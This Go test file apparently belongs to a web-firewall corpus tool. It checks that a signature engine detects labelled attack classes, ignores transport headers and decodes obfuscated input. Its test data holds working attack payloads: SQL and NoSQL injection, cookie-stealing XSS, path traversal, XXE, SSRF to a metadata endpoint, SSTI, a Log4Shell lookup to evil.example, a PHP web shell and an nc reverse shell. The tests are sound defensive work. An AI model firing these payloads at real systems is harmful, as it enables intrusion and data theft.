package security

import (
	"strings"
	"testing"
)

// TestFidelitySignaturesCoverEveryClass pins that no class in fidelityClasses
// was left without patterns. A typo in a map key would otherwise make that
// class permanently "no evidence", which reads as corpus mislabelling rather
// than as the bug it is.
func TestFidelitySignaturesCoverEveryClass(t *testing.T) {
	for _, class := range fidelityClasses {
		patterns := fidelitySignatures[class]
		if len(patterns) == 0 {
			t.Errorf("fidelity class %q has no signatures", class)
		}
		for i, pattern := range patterns {
			if pattern == nil {
				t.Errorf("fidelity class %q signature %d is nil", class, i)
			}
		}
	}
	if _, ok := fidelitySignatures[FidelityDeser]; !ok {
		t.Fatalf("FidelityDeser is in fidelityClasses but has no signatures")
	}
}

func TestFidelityRecognisesEachClass(t *testing.T) {
	cases := []struct {
		class   string
		payload string
	}{
		{"sqli", "id=1' OR '1'='1' -- "},
		{"sqli", "q=admin' UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables--"},
		{"xss", "q=<script>alert(document.cookie)</script>"},
		{"xss", "q=<img src=x onerror=alert(1)>"},
		{"rce", "cmd=; cat /etc/passwd"},
		{"rce", "cmd=foo|bash -c 'nc -e /bin/sh 10.0.0.1 4444'"},
		{"lfi", "file=../../../../etc/passwd"},
		{"lfi", "file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"},
		{"xxe", "<?xml version=\"1.0\"?><!DOCTYPE d [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><d>&x;</d>"},
		{"ssrf", "url=http://169.254.169.254/latest/meta-data/"},
		{"ssrf", "url=http://2130706433:8080/admin"},
		{"ssrf", "url=dict://localhost:11211/stats"},
		{"nosqli", "filter={\"$where\": \"this.isAdmin == true\"}"},
		{"nosqli", "user=admin&pass={\"$ne\": null}"},
		{"ssti", "preview={{ 7*'7' }}"},
		{"ssti", "name=${7*7}"},
		{"log4shell", "ua=${jndi:ldap://evil.example/x}"},
		{"webshell", "<?php system($_GET['cmd']); ?>"},
		{FidelityDeser, "payload=rO0ABXNyABNqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAECAANJAANrZXk="},
	}
	for _, tc := range cases {
		t.Run(tc.class+"/"+tc.class, func(t *testing.T) {
			got := FidelityOfText(tc.payload, tc.class)
			if !got.InClass {
				t.Errorf("payload %q: expected %s evidence, got %v (no evidence: %v)",
					tc.payload, tc.class, got.Classes, got.NoEvidence)
			}
		})
	}
}

// TestFidelityCleanTrafficHasNoEvidence is the other half of the contract: the
// signature set has to stay quiet on ordinary requests, or "no evidence" stops
// meaning anything.
func TestFidelityCleanTrafficHasNoEvidence(t *testing.T) {
	clean := []string{
		"POST /user/login\nusername=john.doe&password=hunter2",
		"GET /api/v1/cart/update\nitem_id=682&quantity=2",
		"PUT /app/user/settings\ntheme=dark&notifications=enabled",
		"GET /assets/css/style.css\n",
		"POST /api/v3/items/search\nsearch=laptop&limit=5",
		"GET /status/ping\n",
	}
	for _, payload := range clean {
		got := FidelityOfText(payload, "")
		if !got.NoEvidence {
			t.Errorf("clean payload %q should carry no attack evidence, got %v", payload, got.Classes)
		}
	}
}

// TestFidelityIgnoresTransportHeaders guards the reason
// transportFidelityHeaders exists. Every record in these corpora ships a
// synthesised Host; without the filter a benign "Host: localhost" reads as SSRF
// and inflates the apparent contamination of the benign files.
func TestFidelityIgnoresTransportHeaders(t *testing.T) {
	tc := Case{
		Method: "GET",
		Target: "/status",
		Header: map[string]string{
			"Host":            "localhost",
			"Accept":          "*/*",
			"Content-Length":  "0",
			"Accept-Encoding": "gzip, deflate, br",
		},
	}
	if got := FidelityOf(tc); !got.NoEvidence {
		t.Errorf("transport headers must not produce evidence, got %v", got.Classes)
	}
}

// TestFidelityScansCookie is the counterweight, and the reason Cookie is not a
// transport header. The ai_waf corpus files rows whose only payload is a
// time-based blind injection in a Cookie value; skipping cookies reported those
// rows as having no attack evidence, which made the engine's correct detection
// look like a false positive.
func TestFidelityScansCookie(t *testing.T) {
	tc := Case{
		Method: "POST",
		Target: "/user/profile/update",
		Body:   "email=john.doe%40hotmail.com&notify=on",
		Header: map[string]string{
			"Host":   "shop.example",
			"Cookie": "session=eyJhbGciOiJIUzI1NiJ9; tracking_id=abc123';/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61,SLEEP(5),0)#",
		},
		Category: "sqli",
	}
	got := FidelityOf(tc)
	if !got.InClass {
		t.Errorf("payload hidden in a Cookie must count as sqli evidence, got %v", got.Classes)
	}
}

// TestFidelitySeesNonRoutineHeader is the counterweight: a hostile custom header
// is attacker-controlled content and must be measured.
func TestFidelitySeesNonRoutineHeader(t *testing.T) {
	tc := Case{
		Method: "GET",
		Target: "/dashboard",
		Header: map[string]string{
			"Host":          "example.com",
			"X-User-Filter": `{"$where": "if (this.isAdmin) { return true; }"}`,
		},
	}
	got := FidelityOf(tc)
	if !contains(got.Classes, "nosqli") {
		t.Errorf("custom header payload must be visible, got %v", got.Classes)
	}
}

// TestFidelityDecodesEncodedPayload pins that encoding is not mistaken for
// innocence. A payload that only reveals itself after decoding must still
// count, otherwise obfuscated rows land in the "no evidence" bucket and look
// like mislabelling.
func TestFidelityDecodesEncodedPayload(t *testing.T) {
	tests := []struct {
		name  string
		text  string
		class string
	}{
		{"percent-encoded ssti", "GET /info?greeting=%7B%7B%207*%277%27%7D%7D", "ssti"},
		{"double-encoded lfi", "GET /file/view?template=..%252f..%252f..%252fetc%252fpasswd", "lfi"},
		{"html-entity xss", "GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt;", "xss"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := FidelityOfText(tt.text, tt.class)
			if !got.InClass {
				t.Errorf("expected %s evidence after decoding, got %v", tt.class, got.Classes)
			}
		})
	}
}

func TestFidelityOfUsesCategoryAsWantClass(t *testing.T) {
	tc := Case{
		Method:   "POST",
		Target:   "/login",
		Body:     `{"username": {"$gt": ""}}`,
		Category: "nosqli",
	}
	got := FidelityOf(tc)
	if !got.InClass {
		t.Errorf("expected InClass for category nosqli, got %v", got.Classes)
	}
}

// TestFidelityVerdictOrderIsDeterministic keeps the reported class list stable
// so a diff between two runs means the corpus changed, not the map iteration.
func TestFidelityVerdictOrderIsDeterministic(t *testing.T) {
	payload := "GET /x?q=../../etc/passwd' OR '1'='1"
	first := strings.Join(FidelityOfText(payload, "").Classes, ",")
	for i := 0; i < 20; i++ {
		if got := strings.Join(FidelityOfText(payload, "").Classes, ","); got != first {
			t.Fatalf("non-deterministic class order: %q vs %q", got, first)
		}
	}
}

func contains(haystack []string, needle string) bool {
	for _, s := range haystack {
		if s == needle {
			return true
		}
	}
	return false
}
